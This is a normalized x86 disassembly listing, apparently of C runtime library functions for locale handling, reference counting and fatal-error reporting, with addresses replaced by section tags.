mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_10031a4c
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_1002baad
mov [ esi ] eax
add esi 0x4
push esi
call sub_1002baad
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1002a091
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_1002a091
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_1002baad
pop ecx
mov [ rw-data ] eax
sub_100283c7
mov edi edi
push esi
push 0x4
push 0x20
call sub_1002a045
mov esi eax
push esi
call sub_1002baad
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_100283f8
push 0xc
push r--data
call sub_1002ca38
call sub_10027b44
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_1002830d
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1002842e
mov eax [ ebp - 0x1c ]
call sub_1002ca7d
retn
sub_1002844b
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_100317b7
test eax eax
je r-xdata
push 0xa
call sub_1002ccc2
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_100317c4
pop ecx
push 0x3
call sub_10027d5e
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_10024b80
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_10028562
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_10028583
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_10024aba
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_10024aba
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_10024aba
push [ esi + 0xc0 ]
call sub_10024aba
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_10031f0a
push [ edi ]
call sub_10024aba
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_10024aba
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10024aba
pop ecx
push [ esi + 0xb0 ]
call sub_10024aba
push [ esi + 0xbc ]
call sub_10024aba
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_10024aba
push [ esi + 0xbc ]
call sub_10032327
pop ecx
pop ecx
push eax
call sub_10024aba
pop ecx
push eax
call sub_10024aba
push [ esi + 0xbc ]
call sub_10032118
pop ecx
pop ecx
sub_100286cc
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_1002875b
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_100287f4
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_100286cc
pop ecx
pop edi
sub_1002881a
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_100286cc
pop ecx
test esi esi
je r-xdata
push esi
call sub_1002875b
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_10028583
pop ecx
sub_10028858
push 0xc
push r--data
call sub_1002ca38
call sub_1002bd74
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_1002881a
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100288c2
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_1002bd74
mov esi [ eax + 0x6c ]
mov eax esi
call sub_1002ca7d
retn
push 0x20
call sub_10027ad8
pop ecx
sub_100288ce
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xa8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xd4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
retn
sub_10028921
push 0x8
push r--data
call sub_1002ca38
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1002ca7d
retn
push 0xd
call sub_1002d1b0
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100289ce
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_10024aba
pop ecx
push 0xc
call sub_1002d1b0
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_1002875b
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100289da
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_10024aba
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_10028583
pop ecx
sub_100289e3
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
dec edi
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10033695
add esp 0xc
test eax eax
je r-xdata
pop esi
sub_10028a23
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_10024b80
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_10024cf0
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_10033709
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ edi + 0x8f ] bl
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_10033709
add esp 0x10
test eax eax
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
cmp bl 0x2c
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_10024cf0
test eax eax
sub_10028b4c
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002b660
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_100246e4
add esp 0x14
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100289e3
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100289e3
add esp 0x14
sub_10028bb9
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0x10 ] ebx
call sub_1002a000
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
lea ebx [ esi + 0x10 ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_100289e3
mov eax [ ebp - 0xc ]
add esp 0x18
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] r--data
push [ ebx + 0x58 ]
mov eax [ ebp - 0xc ]
push [ eax ]
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xc
shl eax 0x4
lea ebx [ eax + esi ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push r--data
push [ eax ]
push 0x3
push 0x351
push edi
call sub_100289e3
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0x10 ] 0x0
push r--data
push 0x351
push edi
call sub_10033695
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_10024aba
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10024aba
pop ecx
mov eax [ ebp - 0x14 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_10024aba
pop ecx
push [ esi + 0x54 ]
call sub_10024aba
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_10024aba
pop ecx
sub_10028d36
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_1002bd74
add eax 0x9c
lea ecx [ eax + 0x28 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0x2c ]
lea ebx [ eax + 0x20 ]
add eax 0xaf
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_10024630
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_10028a23
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1002b660
add esp 0xc
xor esi esi
test eax eax
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
push ebx
push eax
call sub_10033d79
add esp 0xc
test eax eax
je r-xdata
xor esi esi
push esi
push [ ebp - 0xa8 ]
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
movzx eax [ ebx + 0x4 ]
mov ecx [ ebp - 0xac ]
mov [ ecx ] eax
lea eax [ ebp - 0x94 ]
push eax
push edi
push [ ebp - 0x98 ]
call sub_10028b4c
add esp 0xc
cmp [ esi ] 0x0
je r-xdata
cmp [ ebp - 0xa0 ] esi
je r-xdata
push 0x6
push ebx
push [ ebp - 0xa4 ]
call sub_10026f10
add esp 0xc
mov eax [ ebp - 0xa0 ]
cmp eax esi
je r-xdata
xor eax eax
mov [ edi ] ax
mov [ edi + 0x2 ] ax
mov [ edi + 0x4 ] ax
mov eax [ ebp - 0xb4 ]
mov esi r--data
mov eax [ ebp - 0xb0 ]
cmp eax edi
jb r-xdata
push [ ebp - 0x98 ]
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1002b660
add esp 0xc
test eax eax
je r-xdata
push 0x4
push [ ebp - 0xac ]
push [ ebp - 0xa0 ]
call sub_10026f10
add esp 0xc
mov eax [ ebp - 0x9c ]
jmp r-xdata
mov [ eax ] esi
xor esi esi
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
jmp r-xdata
inc eax
push eax
push esi
push edi
push [ ebp - 0xa8 ]
call sub_10033709
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp - 0x98 ]
jmp r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
cmp [ ebp - 0xa4 ] esi
je r-xdata
sub_10028f67
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
mov ebx ecx
call sub_1002bd74
push [ ebp + 0x8 ]
mov edi eax
lea eax [ ebp - 0x198 ]
push eax
lea eax [ ebp - 0x1b0 ]
push eax
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ebx
add edi 0x1d0
call sub_10028d36
add esp 0x18
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
shl eax 0x4
lea ebx [ eax + esi ]
push [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x48 ]
lea eax [ ebp - 0x88 ]
push eax
call sub_10024630
add eax 0x5
push eax
mov [ ebp - 0x18c ] eax
call sub_1002a000
pop ecx
pop ecx
mov [ ebp - 0x190 ] eax
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
mov eax [ ebx + 0x48 ]
mov ecx [ ebp + 0x8 ]
mov [ ebp - 0x1a4 ] eax
lea eax [ esi + ecx * 4 + 0xc ]
add ecx 0x6
imul ecx ecx 0x6
mov [ ebp - 0x194 ] eax
mov eax [ eax ]
mov [ ebp - 0x1a8 ] eax
lea eax [ ecx + esi ]
push 0x6
push eax
mov [ ebp - 0x19c ] eax
lea eax [ ebp - 0x1c4 ]
push eax
call sub_10026f10
mov eax [ esi + 0x4 ]
lea ecx [ ebp - 0x88 ]
push ecx
mov ecx [ ebp - 0x18c ]
mov [ ebp - 0x1b4 ] eax
mov eax [ ebp - 0x190 ]
add ecx 0xfffffffc
add eax 0x4
push ecx
push eax
call sub_1002b660
add esp 0x18
test eax eax
je r-xdata
mov eax [ ebp - 0x190 ]
mov ecx [ ebp - 0x194 ]
add eax 0x4
mov [ ebx + 0x48 ] eax
movzx eax [ ebp - 0x1b0 ]
mov [ ecx ] eax
push 0x6
lea eax [ ebp - 0x1b0 ]
push eax
push [ ebp - 0x19c ]
call sub_10026f10
add esp 0xc
cmp [ ebp + 0x8 ] 0x2
jne r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_100246e4
add esp 0x14
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
mov eax [ ebp - 0x198 ]
and [ ebp - 0x18c ] 0x0
mov [ esi + 0x4 ] eax
mov eax [ edi + 0x24 ]
mov ecx [ edi + 0x20 ]
mov [ ebp - 0x19c ] eax
mov eax edi
mov eax [ ebp + 0x8 ]
imul eax eax 0xc
push esi
call [ eax + r--data ]
pop ecx
test eax eax
je r-xdata
mov eax [ ebp - 0x198 ]
mov [ esi + 0x8 ] eax
mov eax [ ebp - 0x18c ]
test eax eax
je r-xdata
mov edx [ eax ]
inc [ ebp - 0x18c ]
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ ebp - 0x1bc ] edx
mov edx [ eax + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ ebp - 0x1bc ]
add eax 0x8
cmp [ ebp - 0x18c ] 0x5
mov [ ebp - 0x19c ] edx
jl r-xdata
cmp [ ebp - 0x1a4 ] rw-data
je r-xdata
mov eax [ ebp - 0x1a4 ]
push [ ebp - 0x190 ]
mov [ ebx + 0x48 ] eax
call sub_10024aba
mov eax [ ebp - 0x1a8 ]
pop ecx
mov ecx [ ebp - 0x194 ]
mov [ ecx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
cmp [ ebp - 0x18c ] 0x5
jne r-xdata
lea eax [ edi + eax * 8 ]
mov edx [ eax ]
mov [ edi ] edx
mov edx [ eax + 0x4 ]
mov [ edi + 0x4 ] edx
mov [ eax ] ecx
mov ecx [ ebp - 0x19c ]
mov [ eax + 0x4 ] ecx
mov edx [ esi + 0x4 ]
cmp edx [ eax ]
je r-xdata
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x190 ]
add ecx 0x5
shl ecx 0x4
mov [ eax ] 0x1
mov [ ecx + esi ] eax
mov eax [ ebp + 0x8 ]
add eax 0x5
shl eax 0x4
lea edi [ eax + esi ]
push [ edi ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax [ edi + 0x4 ]
mov [ esi + 0xa8 ] eax
push 0x1
push [ esi + 0x14 ]
lea eax [ ebp - 0x188 ]
push [ esi + 0x4 ]
push eax
push 0x7f
push r--data
push 0x1
push 0x0
call sub_10034124
add esp 0x20
test eax eax
je r-xdata
push [ edi ]
call sub_10024aba
push [ ebx + 0x54 ]
call sub_10024aba
and [ ebx + 0x4c ] 0x0
pop ecx
pop ecx
and [ edi + 0x4 ] 0x0
xor eax eax
mov ecx 0x1ff
and [ ebp + eax * 2 - 0x188 ] cx
inc eax
cmp eax 0x7f
jb r-xdata
push 0xfe
push [ rw-data ]
lea eax [ ebp - 0x188 ]
push eax
call sub_10025882
add esp 0xc
neg eax
sbb eax eax
inc eax
mov [ edi + 0x4 ] eax
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ edi ] eax
sub_10029269
mov edi edi
push ebp
mov ebp esp
sub esp 0x98
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi edx
push edi
mov [ ebp - 0x98 ] esi
cmp eax ebx
je r-xdata
mov [ ebp - 0x90 ] 0x1
mov [ ebp - 0x8c ] ebx
cmp ecx ebx
je r-xdata
cmp ecx ebx
je r-xdata
call sub_10028bb9
cmp [ ecx ] 0x4c
jne r-xdata
shl eax 0x4
mov eax [ eax + esi + 0x48 ]
jmp r-xdata
push eax
call sub_10028f67
pop ecx
jmp r-xdata
push ebx
push ebx
push ebx
push 0x83
lea eax [ ebp - 0x88 ]
push eax
push ecx
call sub_10028d36
add esp 0x18
cmp eax ebx
je r-xdata
cmp [ ecx + 0x1 ] 0x43
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_100242d7
leave
retn
lea edi [ esi + 0x48 ]
cmp [ ecx + 0x2 ] 0x5f
jne r-xdata
inc ebx
add edi 0x10
cmp ebx 0x5
jle r-xdata
push [ edi ]
lea eax [ ebp - 0x88 ]
push eax
call sub_100276a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov edi ecx
test ebx ebx
je r-xdata
xor eax eax
cmp [ ebp - 0x90 ] eax
jne r-xdata
inc [ ebp - 0x8c ]
push ebx
lea ecx [ ebp - 0x88 ]
call sub_10028f67
pop ecx
test eax eax
jne r-xdata
xor eax eax
jmp r-xdata
sub eax edi
mov [ ebp - 0x90 ] eax
je r-xdata
cmp [ ebp - 0x8c ] eax
je r-xdata
and [ ebp - 0x90 ] eax
jmp r-xdata
cmp [ ebx ] 0x3b
je r-xdata
mov [ ebp - 0x94 ] 0x1
mov esi r--data
jmp r-xdata
push eax
push edi
push [ esi ]
call sub_10034166
add esp 0xc
test eax eax
jne r-xdata
inc [ ebp - 0x94 ]
add esi 0xc
cmp esi r--data
jle r-xdata
push [ esi ]
call sub_10024630
pop ecx
cmp [ ebp - 0x90 ] eax
je r-xdata
mov eax [ ebp - 0x90 ]
inc ebx
push r--data
push ebx
call sub_10024cf0
mov edi eax
xor esi esi
pop ecx
pop ecx
cmp edi esi
jne r-xdata
cmp [ ebp - 0x94 ] 0x5
jg r-xdata
cmp [ ebx ] 0x3b
jne r-xdata
add edi ebx
cmp [ edi ] 0x0
je r-xdata
push edi
push ebx
lea eax [ ebp - 0x88 ]
push 0x83
push eax
call sub_10033709
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x8c ] eax
je r-xdata
inc edi
cmp [ edi ] 0x0
jne r-xdata
push [ ebp - 0x94 ]
mov esi [ ebp - 0x98 ]
lea ecx [ ebp - 0x88 ]
mov [ ebp + edi - 0x88 ] 0x0
call sub_10028f67
pop ecx
test eax eax
je r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_100246e4
add esp 0x14
mov esi [ ebp - 0x98 ]
jmp r-xdata
push r--data
push edi
call sub_10034230
mov ebx eax
pop ecx
pop ecx
test ebx ebx
je r-xdata
inc [ ebp - 0x8c ]
sub_10029484
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x5
push esi
push edi
ja r-xdata
xor eax eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor edi edi
inc edi
push edi
push 0x8
call sub_1002a045
mov esi eax
pop ecx
pop ecx
test esi esi
jne r-xdata
push edi
push 0xd8
call sub_1002a045
pop ecx
pop ecx
mov [ esi ] eax
test eax eax
jne r-xdata
call sub_1002972b
mov [ eax ] 0xc
push edi
push 0x220
call sub_1002a045
pop ecx
pop ecx
mov [ esi + 0x4 ] eax
test eax eax
jne r-xdata
push esi
call sub_10024aba
mov eax [ esi ]
mov ecx rw-data
call sub_100287f4
push [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov edx [ esi ]
call sub_10029269
pop ecx
test eax eax
jne r-xdata
push [ esi ]
call sub_10024aba
push esi
call sub_10024aba
pop ecx
jmp r-xdata
push [ esi + 0x4 ]
mov eax [ esi ]
push [ eax + 0x4 ]
call sub_100310fc
pop ecx
pop ecx
test eax eax
je r-xdata
push [ esi ]
call sub_1002875b
push [ esi ]
call sub_10028583
push esi
call sub_10024aba
add esp 0xc
jmp r-xdata
pop ecx
jmp r-xdata
mov eax [ esi + 0x4 ]
mov [ eax ] edi
mov eax [ esi + 0x4 ]
mov [ eax ] edi
push [ esi + 0x4 ]
call sub_10024aba
push [ esi ]
call sub_1002875b
